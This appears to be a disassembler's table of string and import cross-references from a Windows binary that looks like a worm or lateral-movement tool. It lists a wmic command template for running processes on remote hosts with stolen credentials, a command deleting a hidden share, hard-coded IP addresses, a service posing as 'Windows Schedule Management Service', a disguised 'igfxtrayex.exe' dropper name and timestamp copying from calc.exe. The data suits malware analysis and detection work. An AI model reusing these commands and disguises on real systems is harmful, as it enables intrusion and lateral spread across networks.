reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4015c4	0x40ca50	string	0x401340	%s\%s
0x401606	0x40ca60	string	0x401340	cmd.exe /q /c net share shared$ /delete
0x40162d	0x40ca58	string	0x401340	%s %s
0x401682	0x408088	import	0x401340	KERNEL32.dll.Sleep
0x401703	0x40cb84	string	0x4016e0	calc.exe
0x401708	0x408074	import	0x4016e0	KERNEL32.dll.CreateFileA
0x401730	0x40807c	import	0x4016e0	KERNEL32.dll.GetFileTime
0x40173b	0x408080	import	0x4016e0	KERNEL32.dll.CloseHandle
0x40174a	0x408080	import	0x4016e0	KERNEL32.dll.CloseHandle
0x40178b	0x408084	import	0x4016e0	KERNEL32.dll.SetFileTime
0x4017a7	0x40cbb0	string	0x4017a0	200.87.126.116
0x4017b1	0x40cba0	string	0x4017a0	58.185.154.99
0x4017ce	0x40cb90	string	0x4017a0	212.31.102.100
0x401807	0x408038	import	0x4017a0	KERNEL32.dll.InitializeCriticalSection
0x40182b	0x40808c	import	0x4017a0	KERNEL32.dll.GetTickCount
0x401837	0x408088	import	0x4017a0	KERNEL32.dll.Sleep
0x4018b8	0x402bc0	string	0x4017a0	SVWhx
0x4018c8	0x408034	import	0x4017a0	KERNEL32.dll.LocalAlloc
0x4018d7	0x408030	import	0x4017a0	KERNEL32.dll.InterlockedIncrement
0x4018eb	0x40802c	import	0x4017a0	KERNEL32.dll.CreateThread
0x4018f6	0x408080	import	0x4017a0	KERNEL32.dll.CloseHandle
0x401903	0x408050	import	0x4017a0	KERNEL32.dll.InterlockedDecrement
0x4019e1	0x408070	import	0x4017a0	KERNEL32.dll.DeleteCriticalSection
0x401a5c	0x408098	import	0x401a10	KERNEL32.dll.GetModuleFileNameA
0x401a7c	0x408074	import	0x401a10	KERNEL32.dll.CreateFileA
0x401a96	0x40804c	import	0x401a10	KERNEL32.dll.SetFilePointer
0x401aa5	0x408048	import	0x401a10	KERNEL32.dll.ReadFile
0x401b10	0x408034	import	0x401a10	KERNEL32.dll.LocalAlloc
0x401b4b	0x408080	import	0x401a10	KERNEL32.dll.CloseHandle
0x401bf1	0x408098	import	0x401a10	KERNEL32.dll.GetModuleFileNameA
0x401c30	0x40cbc4	string	0x401a10	igfxtrayex.exe
0x401c75	0x408074	import	0x401a10	KERNEL32.dll.CreateFileA
0x401cd9	0x408044	import	0x401a10	KERNEL32.dll.WriteFile
0x401ce0	0x408080	import	0x401a10	KERNEL32.dll.CloseHandle
0x401d44	0x408040	import	0x401a10	KERNEL32.dll.CreateProcessA
0x401d5c	0x40803c	import	0x401a10	KERNEL32.dll.LocalFree
0x402209	0x40803c	import	0x401a10	KERNEL32.dll.LocalFree
0x402248	0x40803c	import	0x401a10	KERNEL32.dll.LocalFree
0x402253	0x408058	import	0x401a10	KERNEL32.dll.EnterCriticalSection
0x4023f1	0x408054	import	0x401a10	KERNEL32.dll.LeaveCriticalSection
0x402430	0x40808c	import	0x401a10	KERNEL32.dll.GetTickCount
0x4024b9	0x40cbe0	string	0x401a10	%d.%d.%d.%d
0x402648	0x40cbd4	string	0x401a10	%s|%s|%d\n
0x40265b	0x408050	import	0x401a10	KERNEL32.dll.InterlockedDecrement
0x4026dd	0x40cc4c	string	0x402670	ProcessId
0x402711	0x408068	import	0x402670	KERNEL32.dll.GetCurrentThreadId
0x402718	0x40808c	import	0x402670	KERNEL32.dll.GetTickCount
0x402723	0x40cc44	string	0x402670	%d_%d
0x40275d	0x40cbec	string	0x402670	cmd.exe /c wmic.exe /node:"%s" /user:"%s" /password:"%s" PROCESS CALL CREATE "%s" > %s
0x402784	0x408040	import	0x402670	KERNEL32.dll.CreateProcessA
0x402799	0x408064	import	0x402670	KERNEL32.dll.WaitForSingleObject
0x4027a3	0x408080	import	0x402670	KERNEL32.dll.CloseHandle
0x4027c7	0x408074	import	0x402670	KERNEL32.dll.CreateFileA
0x4027d7	0x408060	import	0x402670	KERNEL32.dll.GetFileSize
0x4027ef	0x408048	import	0x402670	KERNEL32.dll.ReadFile
0x4027fd	0x40805c	import	0x402670	KERNEL32.dll.DeleteFileA
0x402819	0x408120	import	0x402670	SHLWAPI.dll.StrStrIA
0x402b06	0x40808c	import	0x402b00	KERNEL32.dll.GetTickCount
0x402ba7	0x408088	import	0x402b00	KERNEL32.dll.Sleep
0x402bca	0x408058	import	0x402bc0	KERNEL32.dll.EnterCriticalSection
0x402c02	0x408054	import	0x402bc0	KERNEL32.dll.LeaveCriticalSection
0x402cf5	0x408098	import	0x402cc0	KERNEL32.dll.GetModuleFileNameA
0x402d8b	0x408040	import	0x402cc0	KERNEL32.dll.CreateProcessA
0x402d93	0x402da9	string	0x402cc0	_^]3
0x402d99	0x408080	import	0x402cc0	KERNEL32.dll.CloseHandle
0x402e2e	0x40cc58	string	0x402cc0	WinsSchMgmt
0x402e47	0x408014	import	0x402cc0	ADVAPI32.dll.StartServiceCtrlDispatcherA
0x402e63	0x40813c	import	0x402cc0	USER32.dll.LoadStringA
0x402eac	0x408138	import	0x402cc0	USER32.dll.LoadAcceleratorsA
0x402eb2	0x408128	import	0x402cc0	USER32.dll.GetMessageA
0x402ec8	0x408130	import	0x402cc0	USER32.dll.TranslateAcceleratorA
0x402ece	0x408134	import	0x402cc0	USER32.dll.TranslateMessage
0x402ef1	0x408178	import	0x402cc0	USER32.dll.DispatchMessageA
0x402f57	0x408148	import	0x402f20	USER32.dll.LoadCursorA
0x402f80	0x408144	import	0x402f20	USER32.dll.LoadIconA
0x402f8f	0x408140	import	0x402f20	USER32.dll.RegisterClassExA
0x402fd0	0x408154	import	0x402fa0	USER32.dll.CreateWindowExA
0x402fe4	0x408150	import	0x402fa0	USER32.dll.ShowWindow
0x402feb	0x40814c	import	0x402fa0	USER32.dll.UpdateWindow
0x403016	0x40813c	import	0x402fa0	USER32.dll.LoadStringA
0x403057	0x40815c	import	0x402fa0	USER32.dll.DefWindowProcA
0x403092	0x40815c	import	0x402fa0	USER32.dll.DefWindowProcA
0x4030a9	0x408160	import	0x402fa0	USER32.dll.DestroyWindow
0x4030d1	0x408164	import	0x402fa0	USER32.dll.DialogBoxParamA
0x4030f2	0x408168	import	0x402fa0	USER32.dll.BeginPaint
0x403100	0x40816c	import	0x402fa0	USER32.dll.GetClientRect
0x403122	0x408170	import	0x402fa0	USER32.dll.DrawTextA
0x40312e	0x408174	import	0x402fa0	USER32.dll.EndPaint
0x403144	0x40812c	import	0x402fa0	USER32.dll.PostQuitMessage
0x40318e	0x408158	import	0x402fa0	USER32.dll.EndDialog
0x4031a8	0x40cc58	string	0x402fa0	WinsSchMgmt
0x4031e3	0x40801c	import	0x402fa0	ADVAPI32.dll.RegisterServiceCtrlHandlerA
0x40320e	0x408018	import	0x402fa0	ADVAPI32.dll.SetServiceStatus
0x403247	0x408018	import	0x402fa0	ADVAPI32.dll.SetServiceStatus
0x40327c	0x408010	import	0x403270	ADVAPI32.dll.OpenSCManagerA
0x4032ac	0x40cc74	string	0x403270	Windows Schedule Management Service
0x4032b1	0x40cc58	string	0x403270	WinsSchMgmt
0x4032b7	0x40800c	import	0x403270	ADVAPI32.dll.CreateServiceA
0x4032c4	0x408008	import	0x403270	ADVAPI32.dll.CloseServiceHandle
0x4032d3	0x408020	import	0x403270	ADVAPI32.dll.ChangeServiceConfig2A
0x4032e1	0x40cc74	string	0x403270	Windows Schedule Management Service
0x403340	0x408008	import	0x403270	ADVAPI32.dll.CloseServiceHandle
0x40334e	0x40cc58	string	0x403270	WinsSchMgmt
0x403354	0x408000	import	0x403270	ADVAPI32.dll.OpenServiceA
0x403365	0x408004	import	0x403270	ADVAPI32.dll.StartServiceA
0x4033ad	0x40cc98	string	0x403390	1.2.3
0x4033c6	0x408034	import	0x403390	KERNEL32.dll.LocalAlloc
0x4034ab	0x40803c	import	0x403390	KERNEL32.dll.LocalFree
0x4035d8	0x4035dc	string	0x403522	WRPV
0x40360d	0x403611	string	0x403522	3҃}\f blocks=Basic Latin,Cyrillic
0x403648	0x40365c	string	0x403522	_^[]
0x403658	0x40365c	string	0x403522	_^[]
0x4036ef	0x403744	string	0x403661	_^[]
0x403736	0x403744	string	0x403661	_^[]
0x403a12	0x403a1b	string	0x403749	3\vVlj
0x403a4e	0x403a57	string	0x403749	3\v|$
0x403a8f	0x403aa7	string	0x403749	_^][
0x403a94	0x403aa7	string	0x403749	_^][
0x403aa3	0x403aa7	string	0x403749	_^][
0x403cd4	0x403fc3	string	0x403c05	9^htB
0x403f72	0x403f7b	string	0x403c05	3\vVlS+
0x404016	0x40401a	string	0x403c05	3҃|$ blocks=Basic Latin,Cyrillic
0x404053	0x404068	string	0x403c05	_^][YËL$ blocks=Basic Latin,Latin-1 Supplement
0x404064	0x404068	string	0x403c05	_^][YËL$ blocks=Basic Latin,Latin-1 Supplement
0x4040db	0x40cc98	string	0x4040c9	1.2.3
0x4042ee	0x40ce4c	string	0x404199	invalid window size
0x404335	0x40ce34	string	0x404199	incorrect header check
0x404375	0x40ce18	string	0x404199	unknown compression method
0x404389	0x40cdfc	string	0x404199	unknown header flags set
0x40471e	0x40cde8	string	0x404199	header crc mismatch
0x404866	0x40cdd4	string	0x404199	invalid block type
0x4048e4	0x4048f5	string	0x404199	3ۉF@ blocks=Basic Latin,Arabic
0x4048e9	0x40cdb4	string	0x404199	invalid stored block lengths
0x4049fb	0x40cd90	string	0x404199	too many length or distance symbols
0x404a83	0x40cd74	string	0x404199	invalid code lengths set
0x404c5a	0x40cd58	string	0x404199	invalid bit length repeat
0x404cab	0x40cd3c	string	0x404199	invalid literal/lengths set
0x404cf1	0x40cd24	string	0x404199	invalid distances set
0x404e5f	0x40cd08	string	0x404199	invalid literal/length code
0x404f8e	0x40ccf0	string	0x404199	invalid distance code
0x404ffe	0x40ccd0	string	0x404199	invalid distance too far back
0x40516d	0x40ccb8	string	0x404199	incorrect data check
0x4051bc	0x40cca0	string	0x404199	incorrect length check
0x4051ed	0x4052f5	string	0x404199	X_^[
0x40525b	0x4052f5	string	0x404199	X_^[
0x4053a1	0x4053c6	string	0x405390	9^(u
0x4053bc	0x4053c6	string	0x405390	9^(u
0x4053c1	0x405469	string	0x405390	_^[]
0x4054f3	0x4056d4	string	0x4054ac	_^[]ËD$\b blocks=Basic Latin,Latin-1 Supplement
0x4056e3	0x4080b0	import	0x4054ac	MSVCRT.dll.malloc
0x4056ef	0x4080c0	import	0x4054ac	MSVCRT.dll.free
0x405ecd	0x406b8e	string	0x405e7a	3\vL$
0x405fe9	0x405ff2	string	0x405f44	j\a^j
0x40673c	0x406745	string	0x40623f	j\aYj
0x40725d	0x40ccd0	string	0x406f24	invalid distance too far back
0x407266	0x40ccf0	string	0x406f24	invalid distance code
0x40727c	0x40cd08	string	0x406f24	invalid literal/length code
0x4073e2	0x4073fc	string	0x4072d9	FBB;u
0x4076a6	0x4080a8	import	0x4076a6	MPR.dll.WNetCancelConnection2A
0x4076ac	0x4080a4	import	0x4076ac	MPR.dll.WNetAddConnection2A
0x4076b2	0x4081b4	import	0x4076b2	WS2_32.dll.WSACleanup
0x4076b8	0x4081b0	import	0x4076b8	WS2_32.dll.WSAStartup
0x4076be	0x4081ac	import	0x4076be	WS2_32.dll.inet_addr
0x4076c4	0x4081a8	import	0x4076c4	WS2_32.dll.inet_ntoa
0x4076ca	0x4081a4	import	0x4076ca	WS2_32.dll.gethostbyname
0x4076d0	0x4081a0	import	0x4076d0	WS2_32.dll.closesocket
0x4076d6	0x40819c	import	0x4076d6	WS2_32.dll.select
0x4076dc	0x408198	import	0x4076dc	WS2_32.dll.connect
0x4076e2	0x408194	import	0x4076e2	WS2_32.dll.ioctlsocket
0x4076e8	0x408190	import	0x4076e8	WS2_32.dll.socket
0x4076ee	0x40818c	import	0x4076ee	WS2_32.dll.htons
0x4076f4	0x408188	import	0x4076f4	WS2_32.dll.setsockopt
0x4076fa	0x408184	import	0x4076fa	WS2_32.dll.WSAGetLastError
0x407700	0x408180	import	0x407700	WS2_32.dll.shutdown
0x407706	0x4081b8	import	0x407706	WS2_32.dll.send
0x40771d	0x408118	import	0x407710	MSVCRT.dll._onexit
0x40774e	0x4080d4	import	0x40774e	MSVCRT.dll.sprintf
0x407754	0x4080d0	import	0x407754	MSVCRT.dll.strrchr
0x40775a	0x4080cc	import	0x40775a	MSVCRT.dll.srand
0x407760	0x4080c8	import	0x407760	MSVCRT.dll.rand
0x407766	0x4080c4	import	0x407766	MSVCRT.dll.sym_imp_void * __cdecl operator new(unsigned int)
0x40776c	0x4080ec	import	0x40776c	MSVCRT.dll.strtok
0x4077b0	0x4080bc	import	0x4077b0	MSVCRT.dll.strncpy
0x4077b6	0x4080b8	import	0x4077b6	MSVCRT.dll.strchr
0x4077e9	0x4080fc	import	0x4077b6	MSVCRT.dll.__set_app_type
0x4077fe	0x408100	import	0x4077b6	MSVCRT.dll.__p__fmode
0x40780c	0x408104	import	0x4077b6	MSVCRT.dll.__p__commode
0x407838	0x40810c	import	0x4077b6	MSVCRT.dll.__setusermatherr
0x407871	0x408114	import	0x4077b6	MSVCRT.dll.__getmainargs
0x4078c0	0x40809c	import	0x4077b6	KERNEL32.dll.GetStartupInfoA
0x4078ca	0x4078dd	string	0x4077b6	j\nXPVSS
0x4078e4	0x40806c	import	0x4077b6	KERNEL32.dll.GetModuleHandleA
0x4078f4	0x4080e0	import	0x4077b6	MSVCRT.dll.exit
0x40791a	0x4080b4	import	0x40791a	MSVCRT.dll.memcpy
0x407920	0x4080c0	import	0x407920	MSVCRT.dll.free
0x407926	0x4080e4	import	0x407926	MSVCRT.dll._stricmp
0x40792c	0x4080e8	import	0x40792c	MSVCRT.dll.__dllonexit
0x407932	0x4080dc	import	0x407932	MSVCRT.dll._XcptFilter
0x407938	0x408110	import	0x407938	MSVCRT.dll._initterm
0x407966	0x4080f4	import	0x407966	MSVCRT.dll._controlfp
